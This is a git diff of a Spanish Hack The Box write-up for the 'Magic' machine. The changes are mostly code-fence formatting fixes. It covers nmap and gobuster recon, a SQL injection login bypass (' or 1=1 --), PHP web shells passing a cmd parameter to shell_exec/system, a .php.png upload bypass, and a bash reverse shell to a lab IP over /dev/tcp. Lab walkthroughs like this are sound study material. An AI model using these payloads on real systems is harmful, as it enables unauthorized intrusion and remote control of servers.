@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Magic - Hack The Box
-excerpt: "Inyección de SQL es una vulnerabilidad de una aplicación web que permite al atacante introducir instrucciones SQL dentro del código SQL programado para la manipulación de la base de datos."
+excerpt: "Magic comienza con una vulnerabilidad clasica de carga insegura de archivos en PHP que nos permite colocar un webshell en el host de destino y luego explotamos una configuración incorrecta del servidor web para ejecutar el webshell (aunque el nombre del archivo no debe terminar con extensión .php). Una vez que aterrizamos un shell, escalamos a otro usuario"
 date: 2021-12-15
 classes: wide
 header:
@@ -28,35 +28,34 @@ Me ayudé con este video: https://www.youtube.com/watch?v=SmbpScohIFs . Este vid
 
 Inicializar la conexión en este comando:
 
-´´´
+```
 sudo openvpn pack.ovpn
-´´´
+```
 
 En caso de tener el siguiente error al ejecutar el anterior comando: “Linux can't add IPv6 to interface tun1” es poder Ipv6 se encuentra dehabilitado. Se puede habilitar con este comando:
 
-´´´
+```
 sudo sysctl net.ipv6.conf.all.disable_ipv6=0
-´´´
+```
 
 Nos aseguramos que se encuentre habilitado IPv6 con (debe imprimir 0): 
 
-´´´
+```
 cat /proc/sys/net/ipv6/conf/all/disable_ipv6
-´´´
-
+```
 Fuente: https://forum.hackthebox.com/t/openvpn-troubles/3478/2 
 
 Este video sirve para probar conexión con la maquina una vez hemos hecho lo anterior: https://www.youtube.com/watch?v=Ykaw6SSW994 
 
 Podemos comprobar nuestra IP remota con:
 
-´´´
+```
 ip a s tun0
-´´´
+```
 
 Respuesta:
 
-´´´
+```
 8: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
     link/none 
     inet 10.10.14.12/23 scope global tun0
@@ -66,7 +65,7 @@ Respuesta:
     inet6 fe80::e337:d4b5:1e14:2ae7/64 scope link stable-privacy 
        valid_lft forever preferred_lft forever
 
-´´´
+```
 
 ** Desarrollo de la practica:
 
@@ -74,51 +73,51 @@ Basado en video de S4vitar on live: https://www.youtube.com/watch?v=ZJ72UuUlz10
 
 Creo un directorio para la box actual:
 
-´´´
+```
 mkdir magic
-´´´
+```
 
 y creamos los siguientes directorio dentro del él:
 
-´´´
+```
 mkdir nmap content exploits
-´´´
+```
 
 Fase de reconocimiento:
 
-´´´
+```
 cd nmap
-´´´
+```
 
 Comprobamos si tenemos conexión con la maquina con:
 
-´´´
+```
 ping -c 1 10.10.10.185
-´´´
+```
 
 Obtenemos:
 
-´´´
+```
 PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
 64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=183 ms
 
 --- 10.10.10.185 ping statistics ---
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
-´´´
+```
 
 **ttl** (Time To Live) es el maximo numero de rutas IP que un paquete ICMP puede atravesar antes de ser descartado. Y gracias a esto, podemos conocer el sistema operativo que ha respondido a nuestra traza ICMP es Linux, porque una respuesta igual o menor a 64 significa Linux SO, y una menor o igual 128 es Windows OS (El ttl 63 es porque tenemos OpenVPN).
 
 Adicionamente, con ping -R podemos ver las rutas IP por las que paso nuestro ping:
 
-´´´
+```
 ping -c 1 10.10.10.185 -R
-´´´
+```
 
 Vamos a escanear puertos con nmap:
 
-´´´
+```
 nmap -p- --open -T5 -v -n 10.10.10.185
-´´´
+```
 
 Con el anterior comando estamos diciendo:
 	* -p- → Escaneamos todo el rango de puertos (65.535 puertos).
@@ -130,7 +129,7 @@ Con el anterior comando estamos diciendo:
 
 Resultado:
 
-´´´
+```
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-09 18:30 -05
 Initiating Ping Scan at 18:30
 Scanning 10.10.10.185 [2 ports]
@@ -156,14 +155,14 @@ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
-´´´
+```
 
 Otro comando para hacer nuestro reconocimiento de puertos sería (Más rápido que el anterior):
 
-´´´
+```
 nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
 
-´´´
+```
 
 Con el anterior comando estamos diciendo:
 	* -sS → Que vaya los más rápido posible. 
@@ -175,24 +174,24 @@ Con el anterior comando estamos diciendo:
 	* -oG allports → Le decimos que la busqueda realizada la guarde en un archivo grepeable llamado “allports”. [Aqui]( https://www.asyforin.es/kali/herramienta-kali-3-nmap-miscelanea-y-salida-de-datos/ ) puedes encontrar más información sobre el formato grepeable.
 
 
-´´´
+```
 cat allports
-´´´
+```
 
 obtenemos:
 
-´´´
+```
 # Nmap 7.92 scan initiated Tue Dec 14 12:56:22 2021 as: nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
 Host: 10.10.10.185 ()	Status: Up
 Host: 10.10.10.185 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
-´´´
+```
 
 Con esto nos damos cuenta que la máquina tiene abiertos los puertos . Ahora vamos a ver la versión y los servicios que estan corriendo por esos puertos con el siguiente comando:
 
-´´´
+```
 nmap -sCV -p22,80 10.10.10.185 -oN targered
-´´´
+```
 
 Con el anterior comando estamos diciendo:
 	* [-sCV](https://explainshell.com/explain?cmd=nmap+-sC+-sV+-v+) → Versiones y ejecución de algunos scripts por defecto de nmap (algunos scripts son intrusivos). 
@@ -203,7 +202,7 @@ Con el anterior comando estamos diciendo:
 
 Resultado:
 
-´´´
+```
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-14 13:46 -05
 Nmap scan report for 10.10.10.185
 Host is up (0.24s latency).
@@ -222,7 +221,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
 
-´´´
+```
 
 Ahora intentamos acceder a la página “Magic Portfolio” con la url: [http://10.10.10.185/]( http://10.10.10.185/ ) y vemos una página con varias imagenes cargadas:
 
@@ -231,15 +230,15 @@ Ahora intentamos acceder a la página “Magic Portfolio” con la url: [http://
 </p>
 Cada imagen tiene un título con caracteres alfanumericos. Parecen hashes o caracteres hexadecimales. Con la herramienta [xxd](https://francisconi.org/linux/comandos/xxd ) podemos convertir hexadecimal a binario con este comando:
 
-´´´
+```
 echo 4d61676963 | xxd -r -p
-´´´
+```
 
 Salida:
 
-´´´
+```
 Magic
-´´´
+```
 
 Pero no encontramos nada relevante :(
 
@@ -250,13 +249,13 @@ En este punto podemos buscar en el código fuente de la página a ver si encontr
 </p>
 Buscaremos rutas dentro de nuestra página a ver si encontramos descubrimos alguno. Usaremos gobuster para esto:
 
-´´´
+```
 gobuster -h
-´´´
+```
 
 Resultado:
 
-´´´
+```
 sage:
   gobuster [command]
 
@@ -282,17 +281,17 @@ Flags:
   -w, --wordlist string   Path to the wordlist
 
 Use "gobuster [command] --help" for more information about a command.
-´´´
+```
 
 Con este comando de gobuster empezará el escaneo del sitio web:
 
-´´´
+```
 gobuster dir -u http://10.10.10.185/ -w /usr/share/wordlists/dirb/common.txt 
-´´´
+```
 
 Resultado:
 
-´´´
+```
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -319,18 +318,18 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 2021/12/16 15:48:20 Finished
 ===============================================================
-´´´
+```
 
 También con otro diccionario de rutas más amplio de dirbuster (220561 rutas) pero se demora mucho más:
 
 
-´´´
+```
 gobuster dir -x php -u http://10.10.10.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-´´´
+```
 
 Resultado:
 
-´´´
+```
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -356,7 +355,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 2021/12/16 16:52:23 Finished
 ===============================================================
-´´´
+```
 
 Regresando a la página principal, vemos en la parte inferior un botón que nos redirije al login: [http://10.10.10.185/login.php ]( http://10.10.10.185/login.php ) 
 
@@ -366,9 +365,9 @@ Regresando a la página principal, vemos en la parte inferior un botón que nos 
 En este login intentaremos hacer una inyección sql con una condición booleana (Aunque no nos deje poner espacios simplemente podemos poner la inyección en el navegador, la copiamos y pegamos en el campo):
 
 
-´´´
+```
 ' or 1=1 --
-´´´
+```
 
 Y vemos que funciona!!! (Tambien funciona **' or 1=1 #** )
 
@@ -389,11 +388,11 @@ Por las rutas de las imagenes que ya estan podemos decir que las imagenes son al
 - [http://10.10.10.185/images/fulls](http://10.10.10.185/images/fulls)
 Intentaremos subir a nuestra página un archivo de tipo php (esta vulnerabilidad está reportada en [OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) ), el cual nos permita ejecutar comandos a nivel de sistema (dentro del servidor) a través de la URL. El archivo “prueba.php” es el siguiente:
 
-´´´
+```
 <?php
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
-´´´
+```
 El anterior comando nos permitira por medio de etiquetas preformateadas (Texto HTML Preformateado) controlar el valor de la variable “cmd” para poder ejecutar comandos en el servidor que corre el aplicativo web. En caso de funcionar esto, se podrian ejecutar comandos como este ejemplo: http://10.10.10.185/images/uploads/prueba.php?cmd=whoami 
 
 Pero obtenemos que no se admite el formato php, solo 3 tipos de formatos de imagenes:
@@ -402,11 +401,11 @@ Pero obtenemos que no se admite el formato php, solo 3 tipos de formatos de imag
   <img src="../assets/images/htb-writeup-magic/No-se-admite-el-formato.png">
 </p>
 Tampoco si intentamos subir la imagen con una extensión diferente ([prueba.jpg](prueba.jpg)) pero con el mismo contenido:
-´´´
+```
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/tampoco-se-admite-con-otra-extension.png">
 </p>
-´´´
+```
 Pero podemos intentar subir esta secuencia en php jugando con los magic numbers:
 ## Magic Numbers
 
@@ -423,9 +422,9 @@ Lista de algunos números magicos: [1](https://en.wikipedia.org/wiki/List_of_fil
 <br>
 Se complico un poco subir el archivo modificando los magic numbers manualmente, entonces se puede usar un truco que consisten en pones la extension *.php.png* al archivo, y agregar en alguna parte de este archivo (se encuentra en formato binario) codigo en php. Insertaremos la siguiente linea en el archivo **prueba.php.png** :
 
-´´´
+```
 <?php system($_GET['cmd']); ?>
-´´´
+```
 Quedaría algo así:
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/php-en-archivo-extension-php-png.png">
@@ -440,10 +439,10 @@ Probamos la ruta [http://10.10.10.185/images/uploads/pruebaReverseShell2.php.png
 </p>
 De esta forma comprobamos la ejecución de comandos. Ahora intentamos hacer una reverse shell. Para esto primero localmente debemos ponernos en escucha por el puerto 443 usando la herramienta [netcat] (https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos/?utm_source=twitterfeed&utm_medium=twitter):
 
-´´´
+```
 > sudo nc -nlvp 443
 listening on [any] 443 ...
-´´´
+```
 Y en la url establecemos la conexión desde el servidor [http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'](http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'). Pero no anterior no punciona porque la barra de url no reconoce el signo **&** , y en vez de eso debemos poner su correpondiente en códificación url que es ** & → %26 **. Quedaría así: [http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.12/443 0>%261'](http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.12/443 0>%261')
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/reverse-shell-completada.png">
@@ -452,7 +451,7 @@ Ya tenemos una consola para ejecutar comando en el servidor!!!
 <br>
 Aunque la ejecución de comando no aparece en un buen formato, como estamos acostumbrados:
 
-´´´
+```
 www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
 whoami
 www-data
@@ -468,12 +467,12 @@ trx.jpg
 www-data@ubuntu:/var/www/Magic/images/uploads$ ll
 ll
 ll: command not found
-´´´
+```
 Para corregir esto hacemos:
 
-´´´
+```
 script /dev/null -c bash
-´´´
+```
 
 
 
